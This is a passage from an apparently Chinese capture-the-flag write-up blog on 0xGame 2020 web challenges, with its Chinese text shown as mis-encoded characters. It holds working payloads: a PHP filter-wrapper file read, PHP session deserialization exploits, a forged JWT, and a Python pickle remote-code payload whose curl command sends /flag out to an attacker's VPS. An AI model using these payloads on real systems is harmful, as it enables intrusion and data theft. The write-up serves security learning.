punctuation">}</span></span></code></pre><p>POST æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œ<code>id</code> çš„è¯åœ¨ <code>switch</code> é‡Œä¼šè¢«å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œåªéœ€è¦è¾“å…¥ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º 2 å³å¯ã€‚</p><p><code>file</code> çš„è¯ç”¨ PHP ä¼ªåè®®å»è¯»å–ã€‚</p><p>è™½ç„¶è¿‡æ»¤äº†<code>filter|base64</code>ï¼Œä½†åŒ¹é…æ—¶æ²¡æœ‰ä¸åŒºåˆ†å¤§å°å†™ï¼Œè€Œ PHP å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œäºæ˜¯æ”¹ä¸ªå¤§å°å†™å°±å®Œäº‹äº†ã€‚</p><p>payload:</p><pre class="language-none"><code class="language-none">id=2sdf&amp;file=php://filTer/read=convert.basE64-encode/resource=flag.php</code></pre><p>å¾—åˆ° </p><pre class="language-none"><code class="language-none">PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7</code></pre><p>base64decode</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'0xGame{S0me_pHp_tR1cKs_u_G3t_1t}'</span><span class="token punctuation">;</span></span></code></pre><p>get!</p><h3 id="Web-broken-motto"><a href="#Web-broken-motto" class="headerlink" title="Web_broken_motto"></a>Web_broken_motto</h3><blockquote><ul><li>mottoä¸ºå•¥æŸ¥çœ‹ä¸äº†äº†å•Šï¼Ÿ</li><li>Hintï¼šæ³¨æ„æŸ¥çœ‹æ³¨é‡Šçš„åœ°æ–¹ï¼Œæ³¨é‡Šå‰åæœ‰ä»€ä¹ˆåŒºåˆ«</li><li><a href="http://web.game.0xctf.com:30060/">é¢˜ç›®åœ°å€</a></li></ul></blockquote><p><strong>ç°å­¦ç°å–çš„ä¸€é¢˜ï¼Œé¡ºä¾¿æ¥æ€»ç»“äº†ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼ŒPHP å¤ªå¥‡å¦™äº†çœŸçš„ã€‚</strong></p><p>å…ˆæºç å®¡è®¡ã€‚</p><p><code>register.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'motto'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'register success!'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="profile.php"&gt;click hear to see your motto&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'empty username or password!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span></code></pre><p><code>profile.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token comment">//ini_set('session.serialize_handler','php_serialize');</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å‡ºé”™å•¦ï¼è¯»å–ä¸åˆ°ä½ çš„æ ¼è¨€QWQ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></code></pre><p><code>class.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$motto</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'motto'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">motto</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'motto'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'your motto:'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">motto</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span></code></pre><p>æˆ‘ä»¬éœ€è¦è®© <code>$this-&gt;admin=1</code>ï¼Œä»è€Œæ˜¾ç¤º flagã€‚</p><p>PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ <code>$_SESSION</code> æ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä»è€Œå¼•å…¥äº†æ¼æ´ã€‚</p><p>PHP é‡Œæœ‰ä¸‰ç§åºåˆ—åŒ–å¼•æ“ï¼Œå…¶ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯ <code>php</code> å¼•æ“ã€‚</p><blockquote><ul><li><code>php_binary</code>: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦+é”®å+ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li><li><code>php</code>: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡ serialize() å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</li><li><code>php_serialize</code> (php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li></ul></blockquote><p>PHP é‡Œçš„ SESSION æ˜¯ä¿å­˜åœ¨æ–‡ä»¶é‡Œçš„ï¼Œæ–‡ä»¶åæ ¼å¼ä¸º <code>sess_PHPSESSID</code>ï¼Œä¾‹å¦‚ï¼š</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028175323244.png" alt="PHPSESSID"></p><p>æ ¹æ® hintï¼Œprofile é‡Œçš„åº”è¯¥ç”¨çš„æ˜¯é»˜è®¤çš„ php åºåˆ—åŒ–å¼•æ“ï¼Œè€Œ register é‡Œç”¨çš„æ˜¯ <code>php_serialize</code>ã€‚</p><p>profile é‡Œéœ€è¦ <code>isset($_SESSION['username'])</code> æ‰èƒ½è¿›å…¥ï¼Œè€Œè¿™ä¸ª session æ˜¯åœ¨æ³¨å†Œæ—¶ User ç±»é‡Œè®¾ç½®çš„ï¼Œ å³ <code>$_SESSION['username'] = $this-&gt;username;</code>ã€‚</p><p>è®¿é—® profile æ—¶æ‰§è¡Œ <code>session_start();</code> è¯­å¥æ—¶ä»æ–‡ä»¶ä¸­è¯»å– sessionï¼Œå°†å…¶ååºåˆ—åŒ–ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¥½çš„å¯¹è±¡ï¼Œç¼–å†™ä¸€æ®µ php ä»£ç æ¥å¾—åˆ°ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"adfs"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°åºåˆ—åŒ–åçš„ä¸ºï¼š</p><pre class="language-none"><code class="language-none">O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}</code></pre><p>åœ¨æœ€å‰é¢åŠ ä¸Š <code>|</code>ï¼Œæ”¾åˆ°<code>username</code>é‡Œã€‚</p><p>register é‡Œä½¿ç”¨ <code>php_serialize</code> æ‰§è¡Œ <code>$_SESSION['username'] = $this-&gt;username;</code> è¯­å¥æ—¶ï¼Œsession æ–‡ä»¶ä¸­å­˜å‚¨çš„å†…å®¹ä¸º</p><pre class="language-none"><code class="language-none">a:1:{s:8:"username";s:82:"|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}";}</code></pre><p>è€Œ profile åœ¨ <code>session_start();</code> æ‰§è¡Œè¯»å–æ—¶å°†è¿™ä¸ªæ–‡ä»¶é‡Œçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>å°† <code>|</code> ä¹‹å‰çš„å†…å®¹ä½œä¸º SESSION çš„ keyï¼Œä¹‹åçš„å†…å®¹ä½œä¸º valueï¼Œæ‹¿å» unserializeã€‚</p><p>å³ key ä¸º <code>a:1:{s:8:"username";s:82:"</code>ï¼Œ value ä¸º <code>O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}";}</code>ã€‚</p><p>äºæ˜¯åœ¨è®¿é—® profile é¡µé¢æ—¶ï¼Œä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼Œå®ä¾‹åŒ– info å¯¹è±¡ï¼Œæœ€åå°±ä¼šæŠŠ admin ç½®ä¸º1äº†ã€‚</p><hr><p>å…ˆæœ¬åœ°è¯•è¯•ï¼Œæ„é€  payload å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">username=|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}password=adminmotto=ddd</code></pre><p>session æ–‡ä»¶ä¸­çš„å†…å®¹å¦‚ä¸‹ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028175202241.png" alt="session name"></p><p>è®¿é—® profile é¡µé¢æ—¶æˆåŠŸæŠŠ admin ç½®ä¸º1ï¼Œè·å–äº† <code>flag.php</code> é¡µé¢å†…å®¹ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171415054.png" alt="local"></p><p>å†æ‹¿å»è¿œç¨‹è·‘ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171844484.png" alt="form"></p><p>å¾—åˆ° flagã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171714526.png" alt="flag"></p><blockquote><p><strong>References &amp; Extensive Reading:</strong></p><p><a href="https://blog.csdn.net/qq_35569814/article/details/101019333">PHPä¸­çš„ini_set()å‡½æ•°ä»‹ç»</a></p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/7839256.html">PHPååºåˆ—åŒ–æ¼æ´</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105890170">Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ¼æ´ï¼ˆini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);ï¼‰</a></p></blockquote><p>ä¸Šé¢æœ‰æ–‡ç« è¿˜ä»‹ç»äº†å¦ä¸€ç§æ¼æ´ã€‚</p><blockquote><p>è‹¥ <code>session.upload_progress.enabled</code> ä¸º Onï¼Œå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ INI ä¸­è®¾ç½®çš„ <code>session.upload_progress.name</code> åŒåå˜é‡æ—¶ï¼Œå½“ PHP æ£€æµ‹åˆ°è¿™ç§ POST è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨ <code>$_SESSION</code> ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œå³å°±å¯ä»¥å°† filename çš„å€¼èµ‹å€¼åˆ° session ä¸­ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ <strong>Session Upload Progress</strong> æ¥è®¾ç½® sessionã€‚</p></blockquote><p>ä¾‹å¦‚ <a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a> è¿™ä¸€é¢˜ã€‚</p><p>é€šè¿‡æ„é€ ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œå¦‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123aaa<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><p>HTTP å¦‚ä¸‹ï¼Œ<strong>æ³¨æ„è¦å¸¦ä¸Š Cookie</strong>ã€‚</p><pre class="language-none"><code class="language-none">POST /index.php HTTP/1.1Host: web.jarvisoj.com:32784User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCookie: PHPSESSID=jnmfjqfll0kttv9cf6i7dfhh32Content-Type: multipart/form-data; boundary=---------------------------395747469534482322661051838442Content-Length: 436Connection: closeUpgrade-Insecure-Requests: 1-----------------------------395747469534482322661051838442Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"123asdaf-----------------------------395747469534482322661051838442Content-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}"Content-Type: text/plainxxxxx-----------------------------395747469534482322661051838442--</code></pre><p>è¡¨å•é‡Œå¸¦ä¸Š <code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼Œå†ä¿®æ”¹ filename å°±èƒ½å† session åŠ è½½æ—¶åˆ©ç”¨ååºåˆ—åŒ–æŠŠå†…å®¹åŠ è½½åˆ° SESSION ä¸­ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028180153958.png" alt="scanfile"></p><p>å†åˆ©ç”¨ <code>file_get_contents</code> ç»“åˆå½“å‰è·¯å¾„è¯»å–æ–‡ä»¶å³å¯ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028180841912.png" alt="read flag"></p><h3 id="Web-JWT"><a href="#Web-JWT" class="headerlink" title="Web_JWT"></a>Web_JWT</h3><p><a href="http://web.game.0xctf.com:30107/">http://web.game.0xctf.com:30107/</a></p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028000841267.png" alt="login"></p><p>éšæ„è¾“å…¥ç”¨æˆ·åå¯†ç å»ç™»å½•ï¼Œæ ¹æ®è¿”å›çš„ cookie å¾—åˆ° JWT (JSON Web Token)ã€‚</p><p>å‚è€ƒä¹‹å‰çš„ <a href="https://miaotony.xyz/2020/05/30/CTF_2020NUAACTF/#web2-jwt">NUAACTF web2-jwt</a>ï¼Œåˆ©ç”¨ <a href="https://github.com/brendan-rius/c-jwt-cracker"><strong>c-jwt-cracker</strong></a> è·‘å‡º secretã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001232047.png" alt="secret"></p><p>secret å³ <code>njupt</code>ã€‚</p><p>æ‹¿å» jwt.io åŠ å¯†ä¸€ä¸‹å°±å¥½äº†ï¼Œç„¶åæ”¹æ‰ payload é‡Œçš„ <code>role</code> ä¸º <code>admin</code>ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001342451.png" alt="jwt"></p><p>æœ€åæŠŠ cookie æ”¹æˆ Encoded é‡Œçš„é‚£ä¸ªå°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001502881.png" alt="flag"></p><h3 id="Web-easyPython"><a href="#Web-easyPython" class="headerlink" title="Web_easyPython"></a>Web_easyPython</h3><blockquote><ul><li>äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨Python</li><li>ç™»å½•admin</li><li>ç™»å½•æˆåŠŸä¸å¦ä¸æ˜¯å¿…è¦çš„ï¼Œé‡è¦åœ¨è¿‡ç¨‹ï¼Œä»”ç»†çœ‹çœ‹bak</li><li><a href="http://web.game.0xctf.com:30108/">é¢˜ç›®åœ°å€</a></li></ul></blockquote><p>é¦–å…ˆç‚¹å‡» Tips æ‹¿åˆ°é¢˜ç›®çš„æºä»£ç ã€‚</p><p>å…³é”®ä»£ç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># home page</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment"># @login_required</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    usercookies <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Cookies'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> usercookies<span class="token punctuation">:</span>        usercookies <span class="token operator">=</span> <span class="token string">"{'username':'guest'}"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        usercookies <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>usercookies<span class="token punctuation">)</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Cookies'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>usercookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp</code></pre><p>è¿™é‡Œå¾ˆæ˜æ˜¾çœ‹åˆ°äº†<code>pickle</code>ï¼Œè€Œä¸”æ ¹æ®æç¤ºä¸ç™»é™†ä¸å¦æ— å…³ï¼Œé‚£å°±æ˜¯è¿™é‡Œäº†ã€‚</p><p>è¿™é‡Œ <code>pickle.loads</code> ååºåˆ—åŒ–æ—¶è²Œä¼¼æ²¡æœ‰è¿‡æ»¤ï¼Œäºæ˜¯å¯ä»¥ä¼ ä¸€ä¸ª object è¿‡å»ï¼Œåœ¨å®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨ <code>__reduce()__</code> æ–¹æ³•ï¼Œæ‰§è¡Œè¿™é‡Œé¢çš„å†…å®¹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'miaotony'</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'curl http://VPS:PORT/`cat /flag | base64`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload_64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload_64<span class="token punctuation">)</span></code></pre><p>æŠŠè¿™ä¸ªç”Ÿæˆçš„ base64 ç¼–ç çš„ payload ä½œä¸º 